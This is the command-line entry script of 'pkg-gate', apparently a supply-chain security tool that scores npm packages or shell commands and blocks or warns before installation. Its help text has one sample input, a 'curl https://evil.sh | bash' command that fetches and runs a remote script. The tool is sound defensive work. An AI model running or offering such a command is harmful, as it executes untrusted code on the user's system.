#!/usr/bin/env node

import { parseArgs } from 'node:util';
import pkgGate, { formatReport } from '../src/index.js';
import { renderTUI, promptUserConfirmation, promptForTarget } from '../src/tui.js';

const helpText = `
  Usage
    $ pkg-gate [package-name | path | script]

  Options
    --script, -s       Evaluate a raw shell command string
    --json             Output strictly typed structured JSON
    --plain            Output plain text summary (no TUI boxes)
    --mock             Force offline simulation
    --yes, -y          Auto-approve warning prompts in non-interactive CI
    --block-score      Custom threat score to block (default: 2.0)
    --warn-score       Custom threat score to warn (default: 1.2)
    --help, -h         Show help
    --version, -v      Show version

  Examples
    $ pkg-gate esbuild
    $ pkg-gate ./package.json
    $ pkg-gate -s "curl https://evil.sh | bash"
    $ pkg-gate bufferutil --json
`;

async function main() {
  const options = {
    help: { type: 'boolean', short: 'h' },
    version: { type: 'boolean', short: 'v' },
    script: { type: 'boolean', short: 's' },
    json: { type: 'boolean' },
    structured: { type: 'boolean' },
    plain: { type: 'boolean' },
    mock: { type: 'boolean' },
    yes: { type: 'boolean', short: 'y' },
    'block-score': { type: 'string' },
    'warn-score': { type: 'string' },
  };

  let args;
  try {
    args = parseArgs({ options, allowPositionals: true });
  } catch (err) {
    console.error(`Error: ${err.message}\n${helpText}`);
    process.exit(1);
  }

  if (args.values.help) {
    console.log(helpText);
    process.exit(0);
  }

  if (args.values.version) {
    console.log('0.1.0');
    process.exit(0);
  }

  let target = args.positionals[0];

  if (!target && !args.values.script) {
    if (!process.stdin.isTTY) {
      console.error(`\x1b[31mError:\x1b[0m No package name, path, or script specified.\n${helpText}`);
      process.exit(1);
    }

    target = await promptForTarget(helpText);

    if (!target) {
      console.log(helpText);
      process.exit(0);
    }

    if (target === '--help') {
      console.log(helpText);
      process.exit(0);
    }

    if (target === '--version') {
      console.log('0.1.0');
      process.exit(0);
    }
  }

  try {
    const report = await pkgGate(target, {
      script: args.values.script,
      mock: args.values.mock,
      blockScore: args.values['block-score'] ? parseFloat(args.values['block-score']) : undefined,
      warnScore: args.values['warn-score'] ? parseFloat(args.values['warn-score']) : undefined,
    });

    // Structured JSON output
    if (args.values.json || args.values.structured) {
      console.log(JSON.stringify(report.structured, null, 2));
      if (report.action === 'block') {
        process.exit(1);
      } else if (report.action === 'warn') {
        process.exit(2);
      } else {
        process.exit(0);
      }
    }

    // Plain text output
    if (args.values.plain) {
      console.log(formatReport(report));
    } else {
      // Rich TUI output
      console.log(renderTUI(report));
    }

    if (report.action === 'block') {
      process.exit(1);
    } else if (report.action === 'warn') {
      // If interactive terminal and not auto-approved with -y:
      if (!args.values.yes && process.stdin.isTTY) {
        const approved = await promptUserConfirmation();
        if (approved) {
          console.log('\x1b[32m✔ User approved installation despite warning.\x1b[0m');
          process.exit(0);
        } else {
          console.log('\x1b[31m✖ Installation halted by user.\x1b[0m');
          process.exit(2);
        }
      }
      process.exit(2);
    } else {
      process.exit(0);
    }
  } catch (err) {
    console.error(`\x1b[31mError:\x1b[0m ${err.message}`);
    process.exit(1);
  }
}

main();
